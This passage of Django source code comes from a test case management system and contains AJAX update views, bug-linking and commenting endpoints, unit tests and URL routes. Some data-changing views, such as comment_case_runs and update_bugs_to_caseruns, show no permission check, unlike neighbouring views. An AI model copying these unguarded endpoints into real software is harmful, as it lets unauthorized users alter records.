(AttributeError, User.DoesNotExist):\n                pass\n    objects_update(targets, **{field: value})\n\n    if hasattr(model, 'mail_scene'):\n        from tcms.core.utils.mailto import mailto\n\n        mail_context = model.mail_scene(\n            objects=targets, field=field, value=value, ctype=ctype,\n            object_pk=object_pk,\n        )\n        if mail_context:\n            mail_context['context']['user'] = request.user\n            try:\n                mailto(**mail_context)\n            except Exception:  # nosec:B110:try_except_pass\n                pass\n\n    # Special hacking for updating test case run status\n    if ctype == 'testruns.testcaserun' and field == 'case_run_status':\n        for t in targets:\n            field = 'close_date'\n            t.log_action(\n                who=request.user,\n                action='Field %s changed from %s to %s.' % (\n                    field, getattr(t, field), now\n                )\n            )\n            if t.tested_by != request.user:\n                field = 'tested_by'\n                t.log_action(\n                    who=request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        field, getattr(t, field), request.user\n                    )\n                )\n\n            field = 'assignee'\n            try:\n                assignee = t.assginee\n                if assignee != request.user:\n                    t.log_action(\n                        who=request.user,\n                        action='Field %s changed from %s to %s.' % (\n                            field, getattr(t, field), request.user\n                        )\n                    )\n                    # t.assignee = request.user\n                t.save()\n            except (AttributeError, User.DoesNotExist):\n                pass\n        targets.update(close_date=now, tested_by=request.user)\n\n    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))\n\n\nclass ModelUpdateActions(object):\n    \"\"\"Abstract class defining interfaces to update a model properties\"\"\"\n\n\nclass TestCaseUpdateActions(ModelUpdateActions):\n    \"\"\"Actions to update each possible proprety of TestCases\n\n    Define your own method named _update_[property name] to hold specific\n    update logic.\n    \"\"\"\n\n    ctype = 'testcases.testcase'\n\n    def __init__(self, request):\n        self.request = request\n        self.target_field = request.POST.get('target_field')\n        self.new_value = request.POST.get('new_value')\n\n    def get_update_action(self):\n        return getattr(self, '_update_%s' % self.target_field, None)\n\n    def update(self):\n        has_perms = check_permission(self.request, self.ctype)\n        if not has_perms:\n            return say_no(\"You don't have enough permission to update TestCases.\")\n\n        action = self.get_update_action()\n        if action is not None:\n            try:\n                resp = action()\n                self._sendmail()\n            except ObjectDoesNotExist as err:\n                return say_no(str(err))\n            except Exception:\n                # TODO: besides this message to users, what happening should be\n                # recorded in the system log.\n                return say_no('Update failed. Please try again or request '\n                              'support from your organization.')\n            else:\n                if resp is None:\n                    resp = say_yes()\n                return resp\n        return say_no('Not know what to update.')\n\n    def get_update_targets(self):\n        \"\"\"Get selected cases to update their properties\"\"\"\n        case_ids = map(int, self.request.POST.getlist('case'))\n        self._update_objects = TestCase.objects.filter(pk__in=case_ids)\n        return self._update_objects\n\n    def get_plan(self, pk_enough=True):\n        try:\n            return plan_from_request_or_none(self.request, pk_enough)\n        except Http404:\n            return None\n\n    def _sendmail(self):\n        mail_context = TestCase.mail_scene(objects=self._update_objects,\n                                           field=self.target_field,\n                                           value=self.new_value)\n        if mail_context:\n            from tcms.core.utils.mailto import mailto\n\n            mail_context['context']['user'] = self.request.user\n            try:\n                mailto(**mail_context)\n            except Exception:  # nosec:B110:try_except_pass\n                pass\n\n    def _update_priority(self):\n        exists = Priority.objects.filter(pk=self.new_value).exists()\n        if not exists:\n            raise ObjectDoesNotExist('The priority you specified to change '\n                                     'does not exist.')\n        self.get_update_targets().update(**{str(self.target_field): self.new_value})\n\n    def _update_default_tester(self):\n        try:\n            user = User.objects.get(Q(username=self.new_value) | Q(email=self.new_value))\n        except User.DoesNotExist:\n            raise ObjectDoesNotExist('Default tester not found!')\n        self.get_update_targets().update(**{str(self.target_field): user.pk})\n\n    def _update_case_status(self):\n        try:\n            new_status = TestCaseStatus.objects.get(pk=self.new_value)\n        except TestCaseStatus.DoesNotExist:\n            raise ObjectDoesNotExist('The status you choose does not exist.')\n\n        update_object = self.get_update_targets()\n        if not update_object:\n            return say_no('No record(s) found')\n\n        for testcase in update_object:\n            if hasattr(testcase, 'log_action'):\n                testcase.log_action(\n                    who=self.request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        self.target_field, testcase.case_status, new_status.name\n                    )\n                )\n        update_object.update(**{str(self.target_field): self.new_value})\n\n        # ###\n        # Case is moved between Cases and Reviewing Cases tabs accoding to the\n        # change of status. Meanwhile, the number of cases with each status\n        # should be updated also.\n\n        try:\n            plan = plan_from_request_or_none(self.request)\n        except Http404:\n            return say_no(\"No plan record found.\")\n        else:\n            if plan is None:\n                return say_no('No plan record found.')\n\n        confirm_status_name = 'CONFIRMED'\n        plan.run_case = plan.case.filter(case_status__name=confirm_status_name)\n        plan.review_case = plan.case.exclude(case_status__name=confirm_status_name)\n        run_case_count = plan.run_case.count()\n        case_count = plan.case.count()\n        # FIXME: why not calculate review_case_count or run_case_count by using\n        # substraction, which saves one SQL query.\n        review_case_count = plan.review_case.count()\n\n        return http.JsonResponse({\n            'rc': 0, 'response': 'ok',\n            'run_case_count': run_case_count,\n            'case_count': case_count,\n            'review_case_count': review_case_count,\n        })\n\n    def _update_sortkey(self):\n        try:\n            sortkey = int(self.new_value)\n            if sortkey < 0 or sortkey > 32300:\n                return say_no('New sortkey is out of range [0, 32300].')\n        except ValueError:\n            return say_no('New sortkey is not an integer.')\n        plan = plan_from_request_or_none(self.request, pk_enough=True)\n        if plan is None:\n            return say_no('No plan record found.')\n        update_targets = self.get_update_targets()\n\n        # ##\n        # MySQL does not allow to exeucte UPDATE statement that contains\n        # subquery querying from same table. In this case, OperationError will\n        # be raised.\n        offset = 0\n        step_length = 500\n        queryset_filter = TestCasePlan.objects.filter\n        data = {self.target_field: sortkey}\n        while 1:\n            sub_cases = update_targets[offset:offset + step_length]\n            case_pks = [case.pk for case in sub_cases]\n            if len(case_pks) == 0:\n                break\n            queryset_filter(plan=plan, case__in=case_pks).update(**data)\n            # Move to next batch of cases to change.\n            offset += step_length\n\n    def _update_reviewer(self):\n        reviewers = User.objects.filter(username=self.new_value).values_list('pk', flat=True)\n        if not reviewers:\n            err_msg = 'Reviewer %s is not found' % self.new_value\n            raise ObjectDoesNotExist(err_msg)\n        self.get_update_targets().update(**{str(self.target_field): reviewers[0]})\n\n\n# NOTE: what permission is necessary\n# FIXME: find a good chance to map all TestCase property change request to this\n@require_POST\ndef update_cases_default_tester(request):\n    \"\"\"Update default tester upon selected TestCases\"\"\"\n    proxy = TestCaseUpdateActions(request)\n    return proxy.update()\n\n\nupdate_cases_priority = update_cases_default_tester\nupdate_cases_case_status = update_cases_default_tester\nupdate_cases_sortkey = update_cases_default_tester\nupdate_cases_reviewer = update_cases_default_tester\n\n\n@require_POST\ndef comment_case_runs(request):\n    \"\"\"\n    Add comment to one or more caseruns at a time.\n    \"\"\"\n    data = request.POST.copy()\n    comment = data.get('comment', None)\n    if not comment:\n        return say_no('Comments needed')\n    run_ids = [i for i in data.get('run', '').split(',') if i]\n    if not run_ids:\n        return say_no('No runs selected.')\n    runs = TestCaseRun.objects.filter(pk__in=run_ids).only('pk')\n    if not runs:\n        return say_no('No caserun found.')\n    add_comment(runs, comment, request.user)\n    return say_yes()\n\n\ndef clean_bug_form(request):\n    \"\"\"\n    Verify the form data, return a tuple\\n\n    (None, ERROR_MSG) on failure\\n\n    or\\n\n    (data_dict, '') on success.\\n\n    \"\"\"\n    data = {}\n    try:\n        data['bugs'] = request.GET.get('bug_id', '').split(',')\n        data['runs'] = map(int, request.GET.get('case_runs', '').split(','))\n    except (TypeError, ValueError) as e:\n        return (None, 'Please specify only integers for bugs, '\n                      'caseruns(using comma to seperate IDs), '\n                      'and bug_system. (DEBUG INFO: %s)' % str(e))\n\n    data['bug_system_id'] = int(request.GET.get('bug_system_id', 1))\n\n    if request.GET.get('a') not in ('add', 'remove'):\n        return (None, 'Actions only allow \"add\" and \"remove\".')\n    else:\n        data['action'] = request.GET.get('a')\n    data['bz_external_track'] = True if request.GET.get('bz_external_track',\n                                                        False) else False\n\n    return (data, '')\n\n\ndef update_bugs_to_caseruns(request):\n    \"\"\"\n    Add one or more bugs to or remove that from\\n\n    one or more caserun at a time.\n    \"\"\"\n    data, error = clean_bug_form(request)\n    if error:\n        return say_no(error)\n    runs = TestCaseRun.objects.filter(pk__in=data['runs'])\n    bug_system_id = data['bug_system_id']\n    bug_ids = data['bugs']\n\n    try:\n        validate_bug_id(bug_ids, bug_system_id)\n    except ValidationError as e:\n        return say_no(str(e))\n\n    bz_external_track = data['bz_external_track']\n    action = data['action']\n    try:\n        if action == \"add\":\n            for run in runs:\n                for bug_id in bug_ids:\n                    run.add_bug(bug_id=bug_id,\n                                bug_system_id=bug_system_id,\n                                bz_external_track=bz_external_track)\n        else:\n            bugs = Bug.objects.filter(bug_id__in=bug_ids)\n            for run in runs:\n                for bug in bugs:\n                    if bug.case_run_id == run.pk:\n                        run.remove_bug(bug.bug_id, run.pk)\n    except Exception as e:\n        return say_no(str(e))\n    return say_yes()\n\n\ndef get_prod_related_objs(p_pks, target):\n    \"\"\"\n    Get Component, Version, Category, and Build\\n\n    Return [(id, name), (id, name)]\n    \"\"\"\n    ctypes = {\n        'component': (Component, 'name'),\n        'version': (Version, 'value'),\n        'build': (Build, 'name'),\n        'category': (Category, 'name'),\n    }\n    results = ctypes[target][0]._default_manager.filter(product__in=p_pks)\n    attr = ctypes[target][1]\n    results = [(r.pk, getattr(r, attr)) for r in results]\n    return results\n\n\ndef get_prod_related_obj_json(request):\n    \"\"\"\n    View for updating product drop-down\\n\n    in a Ajax way.\n    \"\"\"\n    data = request.GET.copy()\n    target = data.get('target', None)\n    p_pks = data.get('p_ids', None)\n    sep = data.get('sep', None)\n    # py2.6: all(*values) => boolean ANDs\n    if target and p_pks and sep:\n        p_pks = [k for k in p_pks.split(sep) if k]\n        res = get_prod_related_objs(p_pks, target)\n    else:\n        res = []\n    return HttpResponse(json.dumps(res))\n\n\ndef objects_update(objects, **kwargs):\n    objects.update(**kwargs)\n    kwargs['instances'] = objects\n    if objects.model.__name__ == TestCaseRun.__name__ and kwargs.get(\n            'case_run_status', None):\n        POST_UPDATE_SIGNAL.send(sender=None, **kwargs)\n/n/n/ntcms/core/tests/test_views.py/n/n# -*- coding: utf-8 -*-\n\nimport json\nfrom http import HTTPStatus\nfrom urllib.parse import urlencode\n\nfrom django import test\nfrom django.conf import settings\nfrom django.contrib.contenttypes.models import ContentType\nfrom django.core import serializers\nfrom django.urls import reverse\nfrom django_comments.models import Comment\n\nfrom tcms.management.models import Priority\nfrom tcms.management.models import EnvGroup\nfrom tcms.management.models import EnvProperty\nfrom tcms.testcases.forms import TestCase\nfrom tcms.testplans.models import TestPlan\nfrom tcms.testruns.models import TestCaseRun\nfrom tcms.testruns.models import TestCaseRunStatus\nfrom tcms.tests import BaseCaseRun\nfrom tcms.tests import BasePlanCase\nfrom tcms.tests import remove_perm_from_user\nfrom tcms.tests import user_should_have_perm\nfrom tcms.tests.factories import UserFactory\nfrom tcms.tests.factories import EnvGroupFactory\nfrom tcms.tests.factories import EnvGroupPropertyMapFactory\nfrom tcms.tests.factories import EnvPropertyFactory\n\n\nclass TestNavigation(test.TestCase):\n    @classmethod\n    def setUpTestData(cls):\n        super(TestNavigation, cls).setUpTestData()\n        cls.user = UserFactory(email='user+1@example.com')\n        cls.user.set_password('testing')\n        cls.user.save()\n\n    def test_urls_for_emails_with_pluses(self):\n        # test for https://github.com/Nitrate/Nitrate/issues/262\n        # when email contains + sign it needs to be properly urlencoded\n        # before passing it as query string argument to the search views\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.user.username,\n            password='testing')\n        response = self.client.get(reverse('iframe-navigation'))\n\n        self.assertContains(response, urlencode({'people': self.user.email}))\n        self.assertContains(response, urlencode({'author__email__startswith': self.user.email}))\n\n\nclass TestIndex(BaseCaseRun):\n    def test_when_not_logged_in_index_page_redirects_to_login(self):\n        response = self.client.get(reverse('core-views-index'))\n        self.assertRedirects(\n            response,\n            reverse('tcms-login'),\n            target_status_code=HTTPStatus.OK)\n\n    def test_when_logged_in_index_page_redirects_to_dashboard(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n        response = self.client.get(reverse('core-views-index'))\n        self.assertRedirects(\n            response,\n            reverse('tcms-recent', args=[self.tester.username]),\n            target_status_code=HTTPStatus.OK)\n\n\nclass TestCommentCaseRuns(BaseCaseRun):\n    \"\"\"Test case for ajax.comment_case_runs\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestCommentCaseRuns, cls).setUpTestData()\n        cls.many_comments_url = reverse('ajax-comment_case_runs')\n\n    def test_refuse_if_missing_comment(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.many_comments_url,\n                                    {'run': [self.case_run_1.pk, self.case_run_2.pk]})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'Comments needed'})\n\n    def test_refuse_if_missing_no_case_run_pk(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.many_comments_url,\n                                    {'comment': 'new comment', 'run': []})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'No runs selected.'})\n\n        response = self.client.post(self.many_comments_url,\n                                    {'comment': 'new comment'})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'No runs selected.'})\n\n    def test_refuse_if_passed_case_run_pks_not_exist(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.many_comments_url,\n                                    {'comment': 'new comment',\n                                     'run': '99999998,1009900'})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'No caserun found.'})\n\n    def test_add_comment_to_case_runs(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        new_comment = 'new comment'\n        response = self.client.post(\n            self.many_comments_url,\n            {'comment': new_comment,\n             'run': ','.join([str(self.case_run_1.pk),\n                              str(self.case_run_2.pk)])})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n\n        # Assert comments are added\n        case_run_ct = ContentType.objects.get_for_model(TestCaseRun)\n\n        for case_run_pk in (self.case_run_1.pk, self.case_run_2.pk):\n            comments = Comment.objects.filter(object_pk=case_run_pk,\n                                              content_type=case_run_ct)\n            self.assertEqual(new_comment, comments[0].comment)\n            self.assertEqual(self.tester, comments[0].user)\n\n\nclass TestUpdateObject(BasePlanCase):\n    \"\"\"Test case for update\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestUpdateObject, cls).setUpTestData()\n\n        cls.permission = 'testplans.change_testplan'\n        cls.update_url = reverse('ajax-update')\n\n    def setUp(self):\n        user_should_have_perm(self.tester, self.permission)\n\n    def test_refuse_if_missing_permission(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        remove_perm_from_user(self.tester, self.permission)\n\n        post_data = {\n            'content_type': 'testplans.testplan',\n            'object_pk': self.plan.pk,\n            'field': 'is_active',\n            'value': 'False',\n            'value_type': 'bool'\n        }\n\n        response = self.client.post(self.update_url, post_data)\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'Permission Dinied.'})\n\n    def test_update_plan_is_active(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        post_data = {\n            'content_type': 'testplans.testplan',\n            'object_pk': self.plan.pk,\n            'field': 'is_active',\n            'value': 'False',\n            'value_type': 'bool'\n        }\n\n        response = self.client.post(self.update_url, post_data)\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n        plan = TestPlan.objects.get(pk=self.plan.pk)\n        self.assertFalse(plan.is_active)\n\n\nclass TestUpdateCaseRunStatus(BaseCaseRun):\n    \"\"\"Test case for update_case_run_status\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestUpdateCaseRunStatus, cls).setUpTestData()\n\n        cls.permission = 'testruns.change_testcaserun'\n        cls.update_url = reverse('ajax-update_case_run_status')\n\n    def setUp(self):\n        user_should_have_perm(self.tester, self.permission)\n\n    def test_refuse_if_missing_permission(self):\n        remove_perm_from_user(self.tester, self.permission)\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.update_url, {\n            'content_type': 'testruns.testcaserun',\n            'object_pk': self.case_run_1.pk,\n            'field': 'case_run_status',\n            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),\n            'value_type': 'int',\n        })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'Permission Dinied.'})\n\n    def test_change_case_run_status(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.update_url, {\n            'content_type': 'testruns.testcaserun',\n            'object_pk': self.case_run_1.pk,\n            'field': 'case_run_status',\n            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),\n            'value_type': 'int',\n        })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n        self.assertEqual(\n            'PAUSED', TestCaseRun.objects.get(pk=self.case_run_1.pk).case_run_status.name)\n\n\nclass TestUpdateCasePriority(BasePlanCase):\n    \"\"\"Test case for update_cases_default_tester\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestUpdateCasePriority, cls).setUpTestData()\n\n        cls.permission = 'testcases.change_testcase'\n        cls.case_update_url = reverse('ajax-update_cases_default_tester')\n\n    def setUp(self):\n        user_should_have_perm(self.tester, self.permission)\n\n    def test_refuse_if_missing_permission(self):\n        remove_perm_from_user(self.tester, self.permission)\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(\n            self.case_update_url,\n            {\n                'target_field': 'priority',\n                'from_plan': self.plan.pk,\n                'case': [self.case_1.pk, self.case_3.pk],\n                'new_value': Priority.objects.get(value='P3').pk,\n            })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': \"You don't have enough permission to \"\n                                  \"update TestCases.\"})\n\n    def test_update_case_priority(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(\n            self.case_update_url,\n            {\n                'target_field': 'priority',\n                'from_plan': self.plan.pk,\n                'case': [self.case_1.pk, self.case_3.pk],\n                'new_value': Priority.objects.get(value='P3').pk,\n            })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n\n        for pk in (self.case_1.pk, self.case_3.pk):\n            self.assertEqual('P3', TestCase.objects.get(pk=pk).priority.value)\n\n\nclass TestGetObjectInfo(BasePlanCase):\n    \"\"\"Test case for info view method\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestGetObjectInfo, cls).setUpTestData()\n\n        cls.get_info_url = reverse('ajax-info')\n\n        cls.group_nitrate = EnvGroupFactory(name='nitrate')\n        cls.group_new = EnvGroupFactory(name='NewGroup')\n\n        cls.property_os = EnvPropertyFactory(name='os')\n        cls.property_python = EnvPropertyFactory(name='python')\n        cls.property_django = EnvPropertyFactory(name='django')\n\n        EnvGroupPropertyMapFactory(group=cls.group_nitrate,\n                                   property=cls.property_os)\n        EnvGroupPropertyMapFactory(group=cls.group_nitrate,\n                                   property=cls.property_python)\n        EnvGroupPropertyMapFactory(group=cls.group_new,\n                                   property=cls.property_django)\n\n    def test_get_env_properties(self):\n        response = self.client.get(self.get_info_url, {'info_type': 'env_properties'})\n\n        expected_json = json.loads(\n            serializers.serialize(\n                'json',\n                EnvProperty.objects.all(),\n                fields=('name', 'value')))\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            expected_json)\n\n    def test_get_env_properties_by_group(self):\n        response = self.client.get(self.get_info_url,\n                                   {'info_type': 'env_properties',\n                                    'env_group_id': self.group_new.pk})\n\n        group = EnvGroup.objects.get(pk=self.group_new.pk)\n        expected_json = json.loads(\n            serializers.serialize(\n                'json',\n                group.property.all(),\n                fields=('name', 'value')))\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            expected_json)\n/n/n/ntcms/testcases/tests/test_form_views.py/n/n# -*- coding: utf-8 -*-\n\nfrom django import test\nfrom django.urls import reverse\nfrom django.conf import settings\n\nfrom tcms.testcases.forms import CaseAutomatedForm\n\n\nclass TestForm_AutomatedView(test.TestCase):\n    def test_get_form(self):\n        \"\"\"Verify the view renders the expected HTML\"\"\"\n        response = self.client.get(reverse('testcases-form-automated'))\n        form = CaseAutomatedForm()\n        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())\n/n/n/ntcms/testcases/urls/cases_urls.py/n/n# -*- coding: utf-8 -*-\n\nfrom django.conf.urls import url\n\nfrom .. import views\n\nurlpatterns = [\n    url(r'^new/$', views.new, name='testcases-new'),\n    url(r'^$', views.all, name='testcases-all'),\n    url(r'^search/$', views.search, name='testcases-search'),\n    url(r'^load-more/$', views.load_more_cases),\n    url(r'^ajax/$', views.ajax_search, name='testcases-ajax_search'),\n    url(r'^form/automated/$', views.form_automated, name='testcases-form-automated'),\n    url(r'^automated/$', views.automated, name='testcases-automated'),\n    url(r'^component/$', views.component, name='testcases-component'),\n    url(r'^category/$', views.category, name='testcases-category'),\n    url(r'^clone/$', views.clone, name='testcases-clone'),\n    url(r'^printable/$', views.printable, name='testcases-printable'),\n    url(r'^export/$', views.export, name='testcases-export'),\n]\n/n/n/ntcms/testcases/views.py/n/n# -*- coding: utf-8 -*-\n\nimport datetime\nimport json\nimport itertools\n\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth.decorators import permission_required\nfrom django.contrib.contenttypes.models import ContentType\nfrom django.core.exceptions import ObjectDoesNotExist\nfrom django.urls import reverse\nfrom django.db.models import Count\nfrom django.http import HttpResponseRedirect, HttpResponse, Http404\nfrom django.shortcuts import get_object_or_404, render\nfrom django.template.loader import render_to_string\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.views.decorators.http import require_GET\nfrom django.views.decorators.http import require_POST\nfrom django.views.generic.base import TemplateView\n\nfrom django_comments.models import Comment\n\nfrom tcms.core.utils import form_errors_to_list\nfrom tcms.core.logs.models import TCMSLogModel\nfrom tcms.core.utils.raw_sql import RawSQL\nfrom tcms.core.utils import DataTableResult\nfrom tcms.search import remove_from_request_path\nfrom tcms.search.order import order_case_queryset\nfrom tcms.testcases import actions\nfrom tcms.testcases import data\nfrom tcms.testcases.models import TestCase, TestCaseStatus, \\\n    TestCasePlan, BugSystem, \\\n    Bug, TestCaseText, TestCaseComponent\nfrom tcms.management.models import Priority, Tag\nfrom tcms.testplans.models import TestPlan\nfrom tcms.testruns.models import TestCaseRun\nfrom tcms.testruns.models import TestCaseRunStatus\nfrom tcms.testcases.forms import CaseAutomatedForm, NewCaseForm, \\\n    SearchCaseForm, EditCaseForm, CaseNotifyForm, \\\n    CloneCaseForm, CaseBugForm\nfrom tcms.testplans.forms import SearchPlanForm\nfrom tcms.utils.dict_utils import create_dict_from_query\nfrom .fields import CC_LIST_DEFAULT_DELIMITER\n\n\nTESTCASE_OPERATION_ACTIONS = (\n    'search', 'sort', 'update',\n    'remove',  # including remove tag from cases\n    'add',  # including add tag to cases\n    'change',\n    'delete_cases',  # unlink cases from a TestPlan\n)\n\n\n# _____________________________________________________________________________\n# helper functions\n\n\ndef plan_from_request_or_none(request, pk_enough=False):\n    \"\"\"Get TestPlan from REQUEST\n\n    This method relies on the existence of from_plan within REQUEST.\n\n    Arguments:\n    - pk_enough: a choice for invoker to determine whether the ID is enough.\n    \"\"\"\n    tp_id = request.POST.get(\"from_plan\") or request.GET.get(\"from_plan\")\n    if tp_id:\n        if pk_enough:\n            try:\n                tp = int(tp_id)\n            except ValueError:\n                tp = None\n        else:\n            tp = get_object_or_404(TestPlan, plan_id=tp_id)\n    else:\n        tp = None\n    return tp\n\n\ndef update_case_email_settings(tc, n_form):\n    \"\"\"Update testcase's email settings.\"\"\"\n\n    tc.emailing.notify_on_case_update = n_form.cleaned_data[\n        'notify_on_case_update']\n    tc.emailing.notify_on_case_delete = n_form.cleaned_data[\n        'notify_on_case_delete']\n    tc.emailing.auto_to_case_author = n_form.cleaned_data[\n        'author']\n    tc.emailing.auto_to_case_tester = n_form.cleaned_data[\n        'default_tester_of_case']\n    tc.emailing.auto_to_run_manager = n_form.cleaned_data[\n        'managers_of_runs']\n    tc.emailing.auto_to_run_tester = n_form.cleaned_data[\n        'default_testers_of_runs']\n    tc.emailing.auto_to_case_run_assignee = n_form.cleaned_data[\n        'assignees_of_case_runs']\n    tc.emailing.save()\n\n    default_tester = n_form.cleaned_data['default_tester_of_case']\n    if (default_tester and tc.default_tester_id):\n        tc.emailing.auto_to_case_tester = True\n\n    # Continue to update CC list\n    valid_emails = n_form.cleaned_data['cc_list']\n    tc.emailing.update_cc_list(valid_emails)\n\n\ndef group_case_bugs(bugs):\n    \"\"\"Group bugs using bug_id.\"\"\"\n    bugs = itertools.groupby(bugs, lambda b: b.bug_id)\n    bugs = [(pk, list(_bugs)) for pk, _bugs in bugs]\n    return bugs\n\n\ndef create_testcase(request, form, tp):\n    \"\"\"Create testcase\"\"\"\n    tc = TestCase.create(author=request.user, values=form.cleaned_data)\n    tc.add_text(case_text_version=1,\n                author=request.user,\n                action=form.cleaned_data['action'],\n                effect=form.cleaned_data['effect'],\n                setup=form.cleaned_data['setup'],\n                breakdown=form.cleaned_data['breakdown'])\n\n    # Assign the case to the plan\n    if tp:\n        tc.add_to_plan(plan=tp)\n\n    # Add components into the case\n    for component in form.cleaned_data['component']:\n        tc.add_component(component=component)\n    return tc\n\n\n@require_GET\ndef form_automated(request):\n    \"\"\"\n        Return HTML for the form which allows changing of automated status.\n        Form submission is handled by automated() below.\n    \"\"\"\n    form = CaseAutomatedForm()\n    return HttpResponse(form.as_p())\n\n\n@require_POST\n@permission_required('testcases.change_testcase')\ndef automated(request):\n    \"\"\"Change the automated status for cases\n\n    Parameters:\n    - a: Actions\n    - case: IDs for case_id\n    - o_is_automated: Status for is_automated\n    - o_is_automated_proposed: Status for is_automated_proposed\n\n    Returns:\n    - Serialized JSON\n\n    \"\"\"\n    ajax_response = {'rc': 0, 'response': 'ok'}\n\n    form = CaseAutomatedForm(request.POST)\n    if form.is_valid():\n        tcs = get_selected_testcases(request)\n\n        if form.cleaned_data['a'] == 'change':\n            if isinstance(form.cleaned_data['is_automated'], int):\n                # FIXME: inconsistent operation updating automated property\n                # upon TestCases. Other place to update property upon\n                # TestCase via Model.save, that will trigger model\n                #        singal handlers.\n                tcs.update(is_automated=form.cleaned_data['is_automated'])\n            if isinstance(form.cleaned_data['is_automated_proposed'], bool):\n                tcs.update(is_automated_proposed=form.cleaned_data['is_automated_proposed'])\n    else:\n        ajax_response['rc'] = 1\n        ajax_response['response'] = form_errors_to_list(form)\n\n    return HttpResponse(json.dumps(ajax_response))\n\n\n@permission_required('testcases.add_testcase')\ndef new(request, template_name='case/new.html'):\n    \"\"\"New testcase\"\"\"\n    tp = plan_from_request_or_none(request)\n    # Initial the form parameters when write new case from plan\n    if tp:\n        default_form_parameters = {\n            'product': tp.product_id,\n            'is_automated': '0',\n        }\n    # Initial the form parameters when write new case directly\n    else:\n        default_form_parameters = {'is_automated': '0'}\n\n    if request.method == \"POST\":\n        form = NewCaseForm(request.POST)\n        if request.POST.get('product'):\n            form.populate(product_id=request.POST['product'])\n        else:\n            form.populate()\n\n        if form.is_valid():\n            tc = create_testcase(request, form, tp)\n\n            class ReturnActions(object):\n                def __init__(self, case, plan):\n                    self.__all__ = ('_addanother', '_continue', '_returntocase', '_returntoplan')\n                    self.case = case\n                    self.plan = plan\n\n                def _continue(self):\n                    if self.plan:\n                        return HttpResponseRedirect(\n                            '%s?from_plan=%s' % (reverse('testcases-edit',\n                                                         args=[self.case.case_id]),\n                                                 self.plan.plan_id))\n\n                    return HttpResponseRedirect(\n                        reverse('testcases-edit', args=[tc.case_id]))\n\n                def _addanother(self):\n                    form = NewCaseForm(initial=default_form_parameters)\n\n                    if tp:\n                        form.populate(product_id=self.plan.product_id)\n\n                    return form\n\n                def _returntocase(self):\n                    if self.plan:\n                        return HttpResponseRedirect(\n                            '%s?from_plan=%s' % (reverse('testcases-get',\n                                                         args=[self.case.pk]),\n                                                 self.plan.plan_id))\n\n                    return HttpResponseRedirect(\n                        reverse('testcases-get', args=[self.case.pk]))\n\n                def _returntoplan(self):\n                    if not self.plan:\n                        raise Http404\n\n                    return HttpResponseRedirect(\n                        '%s#reviewcases' % reverse('test_plan_url_short',\n                                                   args=[self.plan.pk]))\n\n            # Genrate the instance of actions\n            ras = ReturnActions(case=tc, plan=tp)\n            for ra_str in ras.__all__:\n                if request.POST.get(ra_str):\n                    func = getattr(ras, ra_str)\n                    break\n            else:\n                func = ras._returntocase\n\n            # Get the function and return back\n            result = func()\n            if isinstance(result, HttpResponseRedirect):\n                return result\n            else:\n                # Assume here is the form\n                form = result\n\n    # Initial NewCaseForm for submit\n    else:\n        tp = plan_from_request_or_none(request)\n        form = 